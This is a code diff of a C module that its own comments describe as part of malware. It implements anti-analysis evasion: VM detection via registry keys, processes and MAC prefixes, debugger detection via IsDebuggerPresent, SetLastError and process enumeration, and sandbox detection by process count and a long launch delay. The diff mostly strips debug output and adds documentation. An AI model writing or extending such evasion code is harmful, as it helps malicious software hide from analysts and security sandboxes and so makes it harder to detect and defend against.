@@ -5,27 +5,25 @@
 
 
 /**
- * Anti-VM techniques (9)
+ * Anti-VM techniques
  *   1. Reserved MAC address range for VMware and VirtualBox
  *   2. Checks running processes for background VM processes
  *   3. Checks VMware and VBox registry artifacts! 
- *  
- * Anti-Debugger techniques (9)
+ * 
+ * Anti-Debugger techniques
  *   1. Performs time based detection
  *      - Seen in commands.c file, processCommands(...) function
  *   2. Check for debugger using IsDebuggerPresent() command
  *   3. Use SetLastError to check for debugger
  *   4. * Enumerate processes for known debuggers
  * 
- * Anti-Dissassembly (5)
- *   1. Inline assembly found in main.c file
+ * Anti-Dissassembly
+ *   1. Inline assembly code (in main.c)
  * 
- * Sandboxes (7)
- *   1. Sleep on launch for 15 minutes
+ * Sandboxes
+ *   1. Sleep on launch for 15 minutes (in main.c)
  *   2. Check the number of processes is < 15
  */
-
-// check current window
 
 static RET_CODE detectVM();
 static RET_CODE checkVMArtifacts();
@@ -33,25 +31,25 @@ static RET_CODE checkVMProcesses();
 static RET_CODE checkVMMacs(char* mac);
 
 static RET_CODE detectDebugger();
-static RET_CODE detectDissassembler();
 static RET_CODE detectSandbox();
 
 
+/**
+ * This emthod simply tries to detect whether the malware is being 
+ * run from a VM, it is being debugged, or if is in a sandbox
+ *  
+ * @return whether malware analysis tools were detected
+ */
 RET_CODE detectAnalysisTools() {
-    // try detect malware analysis tools
     RET_CODE ret = detectVM();
     if (ret != R_SAFE_RET) { return ret; }
     
     ret = detectDebugger();
     if (ret != R_SAFE_RET) { return ret; }
-
-    ret = detectDissassembler();
-    if (ret != R_SAFE_RET) { return ret; }
     
     ret = detectSandbox();
     if (ret != R_SAFE_RET) { return ret; }
 
-    printf("No analysis tools detected!\n");
     return R_SAFE_RET;
 }
 
@@ -65,7 +63,8 @@ RET_CODE detectAnalysisTools() {
 
 
 /**
- * 
+ * Checks for VM registry artifcats, then enumerates processes to check
+ * for VM specific processes, lastly checks MAC address for known VM MACs 
  */
 static RET_CODE detectVM() {
     if (checkVMArtifacts() == R_DETECT) { return R_DETECT; }
@@ -73,7 +72,6 @@ static RET_CODE detectVM() {
 
     char mac[18];
     RET_CODE ret = retrieveMAC(mac);
-    printf("MAC: %s\n", mac);
     if (ret != R_SUCCESS) { return ret; }
     if (checkVMMacs(mac) == R_DETECT) { return R_DETECT; }
 
@@ -146,7 +144,7 @@ static RET_CODE checkVMArtifacts() {
     for (int i = 0; i < 5; i++) {
         HKEY hKey;
         if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-            printf("DETECTED: %s\n", regKeys[i]);
+            printf("RegKey detected: %s\n", regKeys[i]);
             RegCloseKey(hKey);
             return R_DETECT;
         }
@@ -163,6 +161,11 @@ static RET_CODE checkVMArtifacts() {
 // ---------------------------
 
 
+/**
+ * First checks if if debugger is present using IsDebuggerPresent, then checks
+ * using the SetLastError technique. Finally checks by enumerating processes for
+ * known debuggers.
+ */
 static RET_CODE detectDebugger() {
     // debugger method 2: simply call windows api function to detect debugger
     BOOL res = IsDebuggerPresent();
@@ -192,21 +195,6 @@ static RET_CODE detectDebugger() {
 }
 
 
-
-// -----------------------------
-// 
-// ---   Anti-Dissassembly   ---
-// 
-// -----------------------------
-
-
-static RET_CODE detectDissassembler() {
-
-    return R_SAFE_RET;
-}
-
-
-
 // --------------------------
 // 
 // ---    Anti-Sandbox    ---
@@ -214,6 +202,9 @@ static RET_CODE detectDissassembler() {
 // --------------------------
 
 
+/**
+ * Simply checks if the number of processes running is less than 15!
+ */
 static RET_CODE detectSandbox() {
     DWORD processes[20];
     DWORD bytesOut;
